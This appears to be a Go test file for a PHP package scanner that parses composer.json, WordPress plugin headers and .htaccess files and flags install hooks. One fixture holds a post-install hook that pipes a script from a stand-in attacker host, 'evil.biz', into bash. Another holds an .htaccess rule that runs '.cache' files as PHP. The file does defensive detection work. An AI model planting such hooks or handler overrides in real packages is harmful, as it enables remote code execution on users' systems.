package php

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParsePackageDir_ComposerClean(t *testing.T) {
	tmp := t.TempDir()
	composerJSON := `{
		"name": "guzzlehttp/guzzle",
		"version": "7.8.1",
		"description": "Guzzle is a PHP HTTP client",
		"type": "library",
		"require": {
			"php": ">=7.2.5"
		}
	}`
	if err := os.WriteFile(filepath.Join(tmp, "composer.json"), []byte(composerJSON), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing clean composer package: %v", err)
	}

	if pkg.Name != "guzzlehttp/guzzle" {
		t.Errorf("expected name 'guzzlehttp/guzzle', got %s", pkg.Name)
	}
	if pkg.Version != "7.8.1" {
		t.Errorf("expected version '7.8.1', got %s", pkg.Version)
	}
	if pkg.HasHooks {
		t.Errorf("expected HasHooks to be false for clean package")
	}
}

func TestParsePackageDir_ComposerLifecycleHook(t *testing.T) {
	tmp := t.TempDir()
	composerJSON := `{
		"name": "malicious/packagist-pwn",
		"version": "1.0.0",
		"scripts": {
			"post-install-cmd": "curl -sL https://evil.biz/sh | bash"
		}
	}`
	if err := os.WriteFile(filepath.Join(tmp, "composer.json"), []byte(composerJSON), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing composer package: %v", err)
	}

	if !pkg.HasHooks {
		t.Errorf("expected HasHooks to be true for post-install-cmd")
	}
	if hook, ok := pkg.HookScripts["post-install-cmd"]; !ok || hook == "" {
		t.Errorf("expected post-install-cmd hook script to be captured")
	}
}

func TestParsePackageDir_WordPressPlugin(t *testing.T) {
	tmp := t.TempDir()
	pluginPhp := `<?php
/*
 * Plugin Name: Rank Math SEO PRO
 * Plugin URI: https://rankmath.com/
 * Description: All-in-one SEO tool for WordPress.
 * Version: 3.0.123
 * Author: Rank Math
 */

if (!defined('ABSPATH')) exit;
`
	if err := os.WriteFile(filepath.Join(tmp, "rank-math-pro.php"), []byte(pluginPhp), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing WordPress plugin: %v", err)
	}

	if pkg.Name != "Rank Math SEO PRO" {
		t.Errorf("expected name 'Rank Math SEO PRO', got '%s'", pkg.Name)
	}
	if pkg.Version != "3.0.123" {
		t.Errorf("expected version '3.0.123', got '%s'", pkg.Version)
	}
	if pkg.Type != "wordpress-plugin" {
		t.Errorf("expected type 'wordpress-plugin', got '%s'", pkg.Type)
	}
}

func TestParsePackageDir_HtaccessHandlerOverride(t *testing.T) {
	tmp := t.TempDir()
	htaccess := `
<FilesMatch "\.cache$">
    SetHandler application/x-httpd-php
</FilesMatch>
`
	if err := os.WriteFile(filepath.Join(tmp, ".htaccess"), []byte(htaccess), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(tmp, "index.php"), []byte("<?php echo 1;"), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing package with htaccess: %v", err)
	}

	if !pkg.HasHooks {
		t.Errorf("expected HasHooks to be true for htaccess handler override")
	}
}

func TestParsePackageDir_NotAPhpPackage(t *testing.T) {
	tmp := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmp, "test.txt"), []byte("hello"), 0644)

	_, err := ParsePackageDir(tmp)
	if err == nil {
		t.Errorf("expected error for non-PHP directory")
	}
}
